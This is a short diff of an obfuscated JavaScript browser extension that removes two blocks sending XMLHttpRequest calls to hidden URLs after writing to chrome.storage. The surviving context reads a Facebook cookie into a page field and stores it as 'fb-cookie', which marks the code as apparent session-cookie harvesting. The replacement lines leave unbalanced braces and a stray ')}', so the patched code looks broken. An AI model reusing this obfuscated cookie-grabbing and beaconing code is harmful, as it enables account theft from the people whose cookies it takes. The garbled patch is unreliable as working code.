@@ -1580,27 +1580,11 @@ $(function () {
                 time: _0x383736,
               },
             }
-            chrome.storage.local.set(_0x160b5a, function () {
-              var _0x20f015 = new XMLHttpRequest()
-              _0x20f015.open('GET', _0x338ffb, true)
-              _0x20f015.send()
-            })
-          }
-        } else {
-          var _0x160b5a = {
-            _0x4ee50c: {
-              value: _0x4ee50c,
-              time: Date.now(),
-            },
-          }
-          chrome.storage.local.set(_0x160b5a, function () {
-            var _0x3f0ac0 = new XMLHttpRequest()
-            _0x3f0ac0.open('GET', _0x5e03b4, true)
-            _0x3f0ac0.send()
-          })
-        }
-      })
+            
+       }
+      }
     }
+)}
     if (_0x1cdd3d) {
       $('#cookieResult1').val(_0x1546ea)
       localStorage.setItem('fb-cookie', _0x1546ea)
